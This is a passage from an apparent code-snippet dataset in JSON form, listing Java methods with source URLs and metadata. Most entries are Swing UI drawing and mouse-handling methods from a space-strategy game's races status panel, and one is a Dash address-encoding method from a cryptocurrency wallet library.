{\n            return Base58.encodeChecked(0x4c, getDeterministicKey(xPubKey).getPubKeyHash());\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/DASH/Dash.java", "stars": "13", "class_props": {"extends": "AbsDeriver", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58839, "method_name": "init", "class_name": "RacesStatusUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        for (int i=0; i<dataY.length; i++)\n            dataY[i] = 0;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58840, "method_name": "drawTexture", "class_name": "RacesStatusUI", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawTexture(Graphics g)      { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58841, "method_name": "textureName", "class_name": "RacesStatusUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String textureName()     { return TEXTURE_BROWN; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58842, "method_name": "changedEmpire", "class_name": "RacesStatusUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void changedEmpire()     { init(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58843, "method_name": "paintComponent", "class_name": "RacesStatusUI", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void paintComponent(Graphics g0) {\n        super.paintComponent(g0);\n        Graphics2D g = (Graphics2D) g0;\n        int w = getWidth();\n        int h = getHeight();\n\n        if (backGradient == null) {\n            Point2D start = new Point2D.Float(0, getHeight() / 2);\n            Point2D end = new Point2D.Float(0, getHeight());\n            float[] dist = {0.0f, 1.0f};\n            Color[] colors = {RacesUI.darkerBrown, RacesUI.gradientBottom};\n            backGradient = new LinearGradientPaint(start, end, dist, colors);\n        }\n        g.setPaint(backGradient);\n        g.fillRect(0,h/2,w, h/2);\n        if (parent.selectedEmpire().isPlayer()) \n            paintPlayerData(g);\n        else\n            paintAIData(g);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58844, "method_name": "initModel", "class_name": "RacesStatusUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initModel() {\n        for (int i=0;i<fullBoxes.length;i++) \n            fullBoxes[i] = new Rectangle();\n        for (int i=0;i<dataBoxes.length;i++) \n            dataBoxes[i] = new Rectangle();\n        for (int i=0;i<dataScrollers.length;i++) \n            dataScrollers[i] = new Rectangle();\n        \n        setBackground(RacesUI.darkerBrown);\n        setBorder(newEmptyBorder(5,5,5,5));\n        addMouseMotionListener(this);\n        addMouseListener(this);\n        addMouseWheelListener(this);        \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58845, "method_name": "paintPlayerData", "class_name": "RacesStatusUI", "params": ["Graphics2D"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void paintPlayerData(Graphics2D g) {\n        Empire emp = parent.selectedEmpire();\n        int w = getWidth();\n        int h = getHeight();\n\n        int s200 = scaled(200);\n        int s210 = scaled(210);\n        int s260 = scaled(260);\n        int s370 = scaled(370);\n        drawRaceIconBase(g, emp, s55, s25, s210, s210);\n        drawRaceIconBase(g, emp, w-s65-s200, s25, s210, s210);\n        drawAllRankingsLists(g, emp, s55, s260, w-s55-s55, h-s260-s10);\n        if (UserPreferences.textures()) \n            drawTexture(g,0,0,w,h);\n        drawRaceIcon(g, emp, s60, s30, s200, s200);\n        drawOpponentIcon(g, null, w-s60-s200, s30, s200, s200);\n        drawPlayerTitle(g, emp, s260, s30, s370, s50);\n        drawVS(g, emp, s260, s90, s370, s50);\n        drawKnownEmpiresTitle(g, emp, w-s60-s200, s30+s200, 0, s50);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58846, "method_name": "paintAIData", "class_name": "RacesStatusUI", "params": ["Graphics2D"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void paintAIData(Graphics2D g) {\n        Empire emp = parent.selectedEmpire();\n        int w = getWidth();\n        int h = getHeight();\n\n        int s200 = scaled(200);\n        int s210 = scaled(210);\n        int s260 = scaled(260);\n        int s370 = scaled(370);\n        drawRaceIconBase(g, emp, s55, s25, s210, s210);\n        drawRaceIconBase(g, emp, w-s65-s200, s25, s210, s210);\n        drawVsRankingsLists(g, emp, s55, s260, w-s55-s55, h-s260-s10);\n        if (UserPreferences.textures()) \n            drawTexture(g,0,0,w,h);\n        drawRaceIcon(g, emp, s60, s30, s200, s200);\n        drawOpponentIcon(g, emp, w-s60-s200, s30, s200, s200);\n        drawPlayerTitle(g, emp, s260, s30, s370, s50);\n        drawVS(g, emp, s260, s90, s370, s50);\n        drawAITitle(g, emp, w-s60-s200, s30+s200, 0, s50);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58847, "method_name": "drawRaceIconBase", "class_name": "RacesStatusUI", "params": ["Graphics2D", "Empire", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawRaceIconBase(Graphics2D g, Empire emp, int x, int y, int w, int h) {\n        g.setColor(RacesUI.darkBrown);\n        Shape rect = new RoundRectangle2D.Float(x,y,w,h,w/8, h/8);\n        g.fill(rect);  \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58848, "method_name": "drawRaceIcon", "class_name": "RacesStatusUI", "params": ["Graphics2D", "Empire", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawRaceIcon(Graphics2D g, Empire emp, int x, int y, int w, int h) {\n        g.setColor(Color.black);\n        Shape rect = new RoundRectangle2D.Float(x,y,w,h,w/8, h/8);\n        g.fill(rect);\n        \n        BufferedImage backImg = parent.raceIconBackImg();\n        g.drawImage(backImg, x,y, null);\n        \n        int x1 = x + w/10;\n        int w1 = w * 8/10;\n        int y1 = y + h/10;\n        int h1 = h * 8/10;\n\n        Image img = player().race().flagPact();\n        int imgH = img.getHeight(null);\n        int imgW = img.getWidth(null);\n        g.drawImage(img, x1, y1, x1+w1, y1+h1, 0, 0, imgW, imgH, null);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58849, "method_name": "drawOpponentIcon", "class_name": "RacesStatusUI", "params": ["Graphics2D", "Empire", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawOpponentIcon(Graphics2D g, Empire emp, int x, int y, int w, int h) {\n        g.setColor(Color.black);\n        Shape rect = new RoundRectangle2D.Float(x,y,w,h,w/8, h/8);\n        g.fill(rect);\n        \n        BufferedImage backImg = parent.raceIconBackImg();\n        g.drawImage(backImg, x,y, null);\n        \n        if (emp == null)\n            return;\n        \n        int x1 = x + w/10;\n        int w1 = w * 8/10;\n        int y1 = y + h/10;\n        int h1 = h * 8/10;\n\n        Image img = player().viewForEmpire(emp).flag();\n        int imgH = img.getHeight(null);\n        int imgW = img.getWidth(null);\n        g.drawImage(img, x1, y1, x1+w1, y1+h1, 0, 0, imgW, imgH, null);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58850, "method_name": "drawPlayerTitle", "class_name": "RacesStatusUI", "params": ["Graphics2D", "Empire", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawPlayerTitle(Graphics2D g, Empire emp, int x, int y, int w, int h) {\n        g.setColor(SystemPanel.orangeText);\n        g.setFont(narrowFont(32));\n        g.drawString(text(\"RACES_STATUS_THE_EMPIRE\", player().name()), x+s10, y+h-s15);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58851, "method_name": "drawVS", "class_name": "RacesStatusUI", "params": ["Graphics2D", "Empire", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawVS(Graphics2D g, Empire emp, int x, int y, int w, int h) {\n        g.setColor(SystemPanel.orangeText);\n        g.setFont(narrowFont(32));\n        String vs = text(\"RACES_STATUS_VS\");\n        int sw = g.getFontMetrics().stringWidth(vs);\n        int x0 = x+(w-sw)/2;\n        g.drawString(vs, x0, y+h-s2);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58852, "method_name": "drawKnownEmpiresTitle", "class_name": "RacesStatusUI", "params": ["Graphics2D", "Empire", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawKnownEmpiresTitle(Graphics2D g, Empire emp, int x, int y, int w, int h) {\n        g.setColor(SystemPanel.orangeText);\n        g.setFont(narrowFont(32));\n        String title = text(\"RACES_STATUS_KNOWN_EMPIRES\", player().contacts().size());\n        int sw = g.getFontMetrics().stringWidth(title);\n        g.drawString(title, x-sw-s10, y-s15);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58853, "method_name": "drawAITitle", "class_name": "RacesStatusUI", "params": ["Graphics2D", "Empire", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawAITitle(Graphics2D g, Empire emp, int x, int y, int w, int h) {\n        g.setColor(SystemPanel.orangeText);\n        g.setFont(narrowFont(32));\n        String title = text(\"RACES_STATUS_THE_EMPIRE\", emp.name());\n        int sw = g.getFontMetrics().stringWidth(title);\n        g.drawString(title, x-sw-s10, y-s15);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58854, "method_name": "drawAllRankingsLists", "class_name": "RacesStatusUI", "params": ["Graphics2D", "Empire", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawAllRankingsLists(Graphics2D g, Empire emp, int x, int y, int w, int h) {\n        g.setColor(RacesUI.darkBrown);\n        g.fillRect(x, y, w, h);\n        int w1 = (w-s20)/3;\n        int h1 = h/2;\n        \n        int x1 = x+s10;\n        int x2 = x1+w1;\n        int x3 = x2+w1;\n        int y1 = y;\n        int y2 = y+h1;\n        \n        drawRankingPane(g, x1, y1, w1, h1, EmpireStatus.FLEET);\n        drawRankingPane(g, x2, y1, w1, h1, EmpireStatus.POPULATION);\n        drawRankingPane(g, x3, y1, w1, h1, EmpireStatus.TECHNOLOGY);\n        drawRankingPane(g, x1, y2, w1, h1, EmpireStatus.PLANETS);\n        drawRankingPane(g, x2, y2, w1, h1, EmpireStatus.PRODUCTION);\n        drawRankingPane(g, x3, y2, w1, h1, EmpireStatus.POWER);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58855, "method_name": "drawRankingPane", "class_name": "RacesStatusUI", "params": ["Graphics2D", "int", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawRankingPane(Graphics2D g, int x, int y, int w, int h, int num) {\n        int numDisplayEmps = bounds(4, galaxy().numActiveEmpires(), 8);\n        \n        g.setFont(font(16));\n        int maxSW =  g.getFontMetrics().stringWidth(player().raceName());\n        for (Empire emp: player().contactedEmpires()) {\n            maxSW = max(maxSW, g.getFontMetrics().stringWidth(emp.raceName()));\n        }\n        int mgnL = maxSW+s5;\n        int mgnR = s5;\n        int mgnT = s40;\n        int mgnB = s10;\n\n        g.setFont(font(20));\n        String title = player().status().title(num);\n        int sw = g.getFontMetrics().stringWidth(title);\n        int x0 = x+mgnL+(w-sw-mgnL)/2;\n        int y0 = y+s35;\n        drawShadowedString(g, title, 1, x0, y0, SystemPanel.blackText, SystemPanel.whiteText);\n\n        int x1 = x+mgnL;\n        int w1 = w-mgnL-mgnR;\n        int y1 = y+mgnT;\n        int listH = h-mgnT-mgnB;\n\n        // recalculate h1 so bars fit in evenly\n        int vSpacing = s5;\n        int tSpacing = s5;\n        int bSpacing = s5;\n        int lSpacing = s5;\n        int rSpacing = s40;\n        int barH = (listH-((numDisplayEmps-1)*vSpacing)-tSpacing-bSpacing)/numDisplayEmps;\n        listH = (barH*numDisplayEmps)+((numDisplayEmps-1)*vSpacing)+tSpacing+bSpacing;\n        int yAdj = (barH-s10)/2;\n\n        g.setColor(RacesUI.darkerBrown);\n        g.fillRect(x1, y1, w1, listH);\n        fullBoxes[num].setBounds(x1-s5-maxSW,y1,w1+s5+maxSW,listH);\n        dataBoxes[num].setBounds(x1,y1,w1,listH);\n        if (dataBoxes[num] == hoverShape) {\n            Stroke prev = g.getStroke();\n            g.setStroke(stroke2);\n            g.setColor(Color.yellow);\n            g.draw(dataBoxes[num]);\n            g.setStroke(prev);\n        }\n             \n        getEmpireListing(num);\n\n        float maxValue = vals.get(0).value;\n        float sumValues = 0;\n        for (RaceValue rv: vals) {\n            if (rv.value > 0)\n                sumValues += rv.value;\n        }\n        int x2 = x1 + lSpacing;\n        int y2 = y1 + tSpacing-dataY[num];\n        int w2 = w1 - lSpacing - rSpacing;\n        g.setFont(font(16));\n        g.setClip(fullBoxes[num]);\n        int rows = vals.size();\n        for (RaceValue rv: vals) {\n            if (rv.value < 0) {\n                g.setColor(RacesUI.darkBrown);\n                String s = text(\"RACES_STATUS_NO_DATA\");\n                g.drawString(s, x2, y2+barH-yAdj);\n            }\n            else {\n                g.setColor(rv.emp.color());\n                int barW = (int) (w2 * (rv.value / maxValue));\n                g.fillRect(x2, y2, barW, barH);\n                g.setColor(RacesUI.brown);\n                float pct = 100*rv.value/sumValues;\n                String val = pct >= 10 ? str(Math.round(pct)) : df1.format(pct); \n                g.drawString(val, x2+barW+s5, y2+barH-yAdj);\n            }\n            String name = rv.emp.raceName();\n            int sw2 = g.getFontMetrics().stringWidth(name);\n            g.setColor(SystemPanel.blackText);\n            g.drawString(name, x1-s5-sw2, y2+barH-yAdj);\n            y2 += (barH+vSpacing);\n        }\n        \n        dataYMax[num] = max(0, s21+(barH*rows) - listH);\n        if (dataYMax[num] == 0) \n            dataScrollers[num].setBounds(0,0,0,0);\n        else {\n            g.setColor(RacesUI.scrollBarC);\n            int scrollW = s12;\n            int scrollH = (int) ((float)listH*listH/(listH+dataYMax[num]));\n            int scrollX = x1+w1-scrollW-s2;\n            int scrollY =(int) (y1+ (float)listH*dataY[num]/(dataYMax[num]+listH));\n            g.fillRoundRect(scrollX, scrollY, scrollW, scrollH, s4, s4);\n            dataScrollers[num].setBounds(scrollX, scrollY, scrollW, scrollH);\n            if (hoverShape == dataScrollers[num]) {\n                Stroke prev = g.getStroke();\n                g.setColor(Color.yellow);\n                g.setStroke(stroke2);\n                g.drawRoundRect(scrollX, scrollY, scrollW, scrollH, s4, s4);\n                g.setStroke(prev);\n            }\n        }\n        g.setClip(null);    \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58856, "method_name": "getEmpireListing", "class_name": "RacesStatusUI", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void getEmpireListing(int cat) {\n        vals.clear();\n        for (Empire emp: player().contactedEmpires()) {\n            int val = emp.status().lastViewValue(player(), cat);\n            int age=  emp.status().age(player());\n            vals.add(new RaceValue(emp, val, age));\n        }\n        int val = player().status().lastViewValue(player(), cat);\n        vals.add(new RaceValue(player(), val, 0));\n        Collections.sort(vals);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58857, "method_name": "drawVsRankingsLists", "class_name": "RacesStatusUI", "params": ["Graphics2D", "Empire", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawVsRankingsLists(Graphics2D g, Empire emp, int x, int y, int w, int h) {\n        g.setColor(RacesUI.darkBrown);\n        g.fillRect(x, y, w, h);\n        int w1 = (w-s20)/3;\n        int h1 = h/2;\n        \n        int x1 = x+s10;\n        int x2 = x1+w1;\n        int x3 = x2+w1;\n        int y1 = y;\n        int y2 = y+h1;\n        \n        drawHistoryPane(g, x1, y1, w1, h1, EmpireStatus.FLEET);\n        drawHistoryPane(g, x2, y1, w1, h1, EmpireStatus.POPULATION);\n        drawHistoryPane(g, x3, y1, w1, h1, EmpireStatus.TECHNOLOGY);\n        drawHistoryPane(g, x1, y2, w1, h1, EmpireStatus.PLANETS);\n        drawHistoryPane(g, x2, y2, w1, h1, EmpireStatus.PRODUCTION);\n        drawHistoryPane(g, x3, y2, w1, h1, EmpireStatus.POWER);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58858, "method_name": "drawHistoryPane", "class_name": "RacesStatusUI", "params": ["Graphics2D", "int", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawHistoryPane(Graphics2D g, int x, int y, int w, int h, int cat) {\n        int mgnL = s20;\n        int mgnR = s20;\n        int mgnT = s50;\n        int mgnB = s10;\n\n        g.setFont(font(20));\n        String title = player().status().title(cat);\n        int sw = g.getFontMetrics().stringWidth(title);\n        int x0 = x+mgnL+(w-sw-mgnL)/2;\n        int y0 = y+s35;\n        drawShadowedString(g, title, 1, x0, y0, SystemPanel.blackText, SystemPanel.whiteText);\n\n        int x1 = x+mgnL;\n        int w1 = w-mgnL-mgnR;\n        int y1 = y+mgnT;\n        int h1 = h-mgnT-mgnB;\n\n        // recalculate h1 so bars fit in evenly\n        int tSpacing = s20;\n        int bSpacing = s10;\n        int lSpacing = s5;\n        int rSpacing = s25;\n\n        g.setColor(RacesUI.darkerBrown);\n        g.fillRect(x1, y1, w1, h1);\n\n        int[] playerVals = player().status().values(cat);\n        int[] empireVals = parent.selectedEmpire().status().values(cat);\n        int totalTurns = galaxy().numberTurns();\n        int empireTurns = parent.selectedEmpire().status().lastViewTurn(player());\n        int displayW = w1-rSpacing-lSpacing;\n        int displayH = h1-tSpacing-bSpacing;\n\n        // find maximum Y value to display\n        int maxYValue = 0;\n        for (int i=0;i<totalTurns;i++)\n            maxYValue = Math.max(playerVals[i], maxYValue);\n        for (int i=0;i<empireTurns;i++)\n            maxYValue = Math.max(empireVals[i], maxYValue);\n\n        int startX = x1+lSpacing;    // x-location for pt values in turn 0\n        int startY = y1+h1-bSpacing; // y-location for pt values = 0\n        int maxPtSpacing = s20;\n        Stroke prevStroke = g.getStroke();\n        g.setStroke(stroke2);\n        g.setFont(font(18));\n\n        // DRAW SELECTED EMPIRE\n        g.setColor(parent.selectedEmpire().color());\n        String name = parent.selectedEmpire().raceName();\n        int nameW = g.getFontMetrics().stringWidth(name);\n        g.drawString(name, startX+displayW+rSpacing-s5-nameW, startY+s5);\n        int prevX = startX;\n        int prevY = -1;\n        for (int i=0;i<empireTurns;i++) {\n            int ptX = startX+(displayW*i/totalTurns);\n            if ((ptX - prevX) > maxPtSpacing)\n                ptX = prevX + maxPtSpacing;\n            int ptY = startY-(displayH*empireVals[i]/maxYValue);\n            if (prevY >= 0)\n                g.drawLine(prevX, prevY, ptX, ptY);\n            prevX = ptX;\n            prevY = ptY;\n        }\n\n        // DRAW PLAYER\n        g.setColor(player().color());\n        g.drawString(player().raceName(), startX, startY-displayH);\n        prevX = startX;\n        prevY = -1;\n        for (int i=0;i<totalTurns;i++) {\n            int ptX = startX+(displayW*i/totalTurns);\n            if ((ptX - prevX) > maxPtSpacing)\n                ptX = prevX + maxPtSpacing;\n            int ptY = maxYValue == 0 ? 0 : startY-(displayH*playerVals[i]/maxYValue);\n            if (prevY >= 0)\n                g.drawLine(prevX, prevY, ptX, ptY);\n            prevX = ptX;\n            prevY = ptY;\n        }\n\n       if (empireTurns < 0) {\n            g.setFont(narrowFont(24));\n            g.setColor(RacesUI.darkBrown);\n            String s = text(\"RACES_STATUS_NO_DATA\");\n            int sw1 = g.getFontMetrics().stringWidth(s);\n            g.drawString(s, x1+(w1-sw1)/2, y1+(h1+s24)/2);            \n        }\n        // DRAW SELECTED EMPIRE AGAIN, with dashed lines\n        g.setStroke(dashedLineStroke);\n        g.setColor(parent.selectedEmpire().color());\n        prevX = startX;\n        prevY = -1;\n        for (int i=0;i<empireTurns;i++) {\n            int ptX = startX+(displayW*i/totalTurns);\n            if ((ptX - prevX) > maxPtSpacing)\n                ptX = prevX + maxPtSpacing;\n            int ptY = maxYValue == 0 ? 0 : startY-(displayH*empireVals[i]/maxYValue);\n            if (prevY >= 0)\n                g.drawLine(prevX, prevY, ptX, ptY);\n            prevX = ptX;\n            prevY = ptY;\n        }\n        g.setStroke(prevStroke);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58859, "method_name": "mouseWheelMoved", "class_name": "RacesStatusUI", "params": ["MouseWheelEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseWheelMoved(MouseWheelEvent e) {\n        int count = e.getUnitsToScroll();\n        for (int i=0;i<dataBoxes.length;i++) {\n            if ((hoverShape == dataBoxes[i])\n            || (hoverShape == dataScrollers[i])) {\n                int prevY = dataY[i];\n                if (count < 0)\n                    dataY[i] = max(0,dataY[i]-s10);\n                else \n                    dataY[i] = min(dataYMax[i],dataY[i]+s10);\n                if (dataY[i] != prevY)\n                    repaint(fullBoxes[i]);\n                return;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58860, "method_name": "mouseDragged", "class_name": "RacesStatusUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseDragged(MouseEvent e) { \n        int x = e.getX();\n        int y = e.getY();\n        int dY = y-dragY;\n        dragY = y;\n        for (int i=0;i<dataBoxes.length;i++) {\n            if (dataScrollers[i] == hoverShape) {\n                if ((y >= dataBoxes[i].y) || (y <= (dataBoxes[i].y+dataBoxes[i].height))) { \n                    int h = (int) dataBoxes[i].getHeight();\n                    int dListY = (int)((float)dY*(h+dataYMax[i])/h);\n                    if (dY < 0)\n                        dataY[i] = max(0,dataY[i]+dListY);\n                    else \n                        dataY[i] = min(dataYMax[i],dataY[i]+dListY);\n                }\n                repaint(fullBoxes[i]);\n                return;\n            }\n            else if (dataBoxes[i] == hoverShape) {\n                if (dataBoxes[i].contains(x,y)) { \n                    int h = (int) dataBoxes[i].getHeight();\n                    int dListY = (int)(-(float)dY*(h+dataYMax[i])/h);\n                    if (dListY < 0)\n                        dataY[i] = max(0,dataY[i]+dListY);\n                    else \n                        dataY[i] = min(dataYMax[i],dataY[i]+dListY);\n                }\n                repaint(fullBoxes[i]);\n                return;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58861, "method_name": "mouseMoved", "class_name": "RacesStatusUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseMoved(MouseEvent e) {\n        int x = e.getX();\n        int y = e.getY();\n        Shape prevHover = hoverShape;\n        hoverShape = null;\n        for (int i=0;i<dataBoxes.length;i++) {\n            if (dataScrollers[i].contains(x,y)) \n                hoverShape = dataScrollers[i];\n            else if (dataBoxes[i].contains(x,y)) \n                hoverShape = dataBoxes[i];\n        }\n        if (hoverShape != prevHover) \n            repaint();     \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58862, "method_name": "mouseClicked", "class_name": "RacesStatusUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseClicked(MouseEvent mouseEvent) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58863, "method_name": "mousePressed", "class_name": "RacesStatusUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mousePressed(MouseEvent e) { \n        dragY = e.getY();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58864, "method_name": "mouseReleased", "class_name": "RacesStatusUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseReleased(MouseEvent e) {\n        if (e.getButton() > 3)\n            return;\n        dragY = 0;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58865, "method_name": "mouseEntered", "class_name": "RacesStatusUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseEntered(MouseEvent mouseEvent) {}", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58866, "method_name": "mouseExited", "class_name": "RacesStatusUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseExited(MouseEvent mouseEvent) {\n        if (hoverShape != null) {\n            hoverShape = null;\n            